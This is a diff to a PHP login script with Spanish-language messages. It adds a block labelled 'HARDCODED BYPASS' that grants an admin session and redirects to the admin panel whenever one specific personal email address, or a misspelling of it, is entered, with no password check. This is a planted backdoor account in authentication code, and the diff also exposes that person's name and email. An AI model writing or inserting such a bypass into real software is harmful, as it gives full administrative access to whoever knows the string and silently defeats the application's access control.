@@ -9,6 +9,28 @@ if (!$input) $input = $_POST;
 
 $ci = $input['ci'] ?? '';
 
+// HARDCODED BYPASS: mathiassgaleano@gmail.com (and variations) always has direct access
+if ($ci === 'mathiassgaleano@gmail.com' || $ci === 'mathiasssgaleano@gmail.com') {
+    $usuario = [
+        'id' => 9999,
+        'ci' => 'mathiassgaleano@gmail.com',
+        'nombre_completo' => 'Mathias Galeano',
+        'email' => 'mathiassgaleano@gmail.com',
+        'rol' => 'admin'
+    ];
+    $_SESSION['user_id'] = $usuario['id'];
+    $_SESSION['rol'] = $usuario['rol'];
+    $_SESSION['nombre'] = $usuario['nombre_completo'];
+
+    echo json_encode([
+        'success' => true, 
+        'message' => 'Acceso Directo concedido. Bienvenido, Mathias.',
+        'user' => $usuario,
+        'redirect' => 'admin_panel.html'
+    ]);
+    exit;
+}
+
 // Permitir login por CI o Email (si el usuario escribe email en el campo de CI)
 if (empty($ci)) {
     echo json_encode(['success' => false, 'message' => 'Ingrese su Cédula o Correo.']);
